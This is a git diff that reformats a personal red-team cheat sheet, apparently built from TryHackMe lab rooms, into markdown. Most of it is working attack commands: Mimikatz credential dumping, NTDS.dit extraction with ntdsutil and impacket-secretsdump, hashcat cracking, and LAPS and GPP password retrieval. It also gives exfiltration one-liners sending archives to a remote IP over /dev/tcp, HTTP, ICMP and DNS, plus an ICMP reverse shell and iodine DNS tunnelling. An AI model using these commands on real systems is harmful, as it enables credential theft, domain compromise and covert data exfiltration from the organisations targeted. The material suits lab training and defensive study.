-Mimikatz
+```
+#### Mimikatz
+```
 privilege::debug
 sekurlsa::credman
-
-
-# NTDS Domain Controller
+```
+### NTDS Domain Controller
 
 NTDS.DTS data consists of three tables as follows:
 
     Schema table: it contains types of objects and their relationships.
-    Link table: it contains the object  attributes and their values.
+    Link table: it contains the obj
+ect  attributes and their values.
     Data type: It contains users and groups.
 
 
@@ -919,9 +846,10 @@ Ntdsutil Ntdsutil is a Windows utility to used manage and maintain Active Direct
     Set Directory Services Restore Mode (DSRM) administrator passwords.
 
 
-Local Dumping (No Credentials)
+### Local Dumping (No Credentials)
 
 dump following files 
+```
     C:\Windows\NTDS\ntds.dit
 
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
@@ -933,64 +861,66 @@ dump following files
 
 
 impacket-secretsdump   -system SYSTEM -ntds ntds.dit local
+```
 
-
-Remote Dumping (With Credentials)
+### Remote Dumping (With Credentials)
+```
 impacket-secretsdump   -just-dc THM.red/<AD_Admin_User>@10.10.253.212 
 impacket-secretsdump  -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.253.212
-
-
-crack hash 
+```
+#### crack hash 
+```
 hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
+```
+### Local Administrator Password Solution (LAPS) 
 
-
-# Local Administrator Password Solution (LAPS) 
-
-Group Policy Preferences (GPP)
-
+#### Group Policy Preferences (GPP)
+```
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
+```
 
-
-Local Administrator Password Solution (LAPS)
-
+#### Local Administrator Password Solution (LAPS)
+```
 ms-mcs-AdmPwd : attribute contains a clear-text password of the local administrator
 ms-mcs-AdmPwdExpirationTime : contains the expiration time to reset the password
 
 LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd
-
-Enumerate for LAPS
-
+```
+#### Enumerate for LAPS
+```
 dir "C:\Program Files\LAPS\CSE"
-
-Listing the available PowerShell cmdlets for LAPS 
+```
+#### Listing the available PowerShell cmdlets for LAPS 
+```
 Get-Command *AdmPwd*
-
-Finding Users with AdmPwdExtendedRights Attribute 
+```
+#### Finding Users with AdmPwdExtendedRights Attribute 
+```
 Find-AdmPwdExtendedRights -Identity THMorg
-
-Finding Users belong to THMGroupReader Group 
+```
+#### Finding Users belong to THMGroupReader Groups
+```
 net groups "THMGroupReader"
-
-Getting the Password
+```
+#### Getting the Password
+```
 Get-AdmPwdPassword -ComputerName creds-harvestin
-
-
-
-
-======================= dataxexfilt =========================
-
-
+```
+### data exfiltration
+```
 tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
-
-restoring data
+```
+#### restoring data
+```
 dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+```
 
-
-[+] SSH 
+### [+] SSH 
+```
 tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
-
-[+] http 
-
+```
+### [+] http 
+```
 <?php 
 if (isset($_POST['file'])) {
         $file = fopen("/tmp/http.bs64","w");
@@ -1003,39 +933,40 @@ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
 
 sed -i 's/ /+/g' /tmp/http.bs64
 cat /tmp/http.bs64 | base64 -d | tar xvfz -
+```
 
-
-[+] tunnling 
+### [+] tunnling 
+```
 https://github.com/L-codes/Neo-reGeorg
-
-
-
-[+] ICMP
-
+```
+### [+] ICMP
+```
 use auxiliary/server/icmp_exfil
 set BPF_FILTER icmp and not src ATTACKBOX_IP
+```
 
+### reverse shell 
+```
+victim
 
-reverse shell 
-victim 
  icmpdoor -i eth0 -d 192.168.0.133
  attacker 
  icmp-cnc -i eth1 -d 192.168.0.121
-
-
-
- [+] DNS Exfiltration 
+```
+### [+] DNS Exfiltration 
+```
   cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 
 
   cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
  echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
-
-
- [+] DNS tunnling
+```
+### [+] DNS tunnling
  setup NS record value attacker ip 
  run command on attacker vm 
+```
  sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com 
-
- victim vm 
+```
+### victim vm 
+```
   sudo iodine -P thmpass att.tunnel.com 
-  
+```  
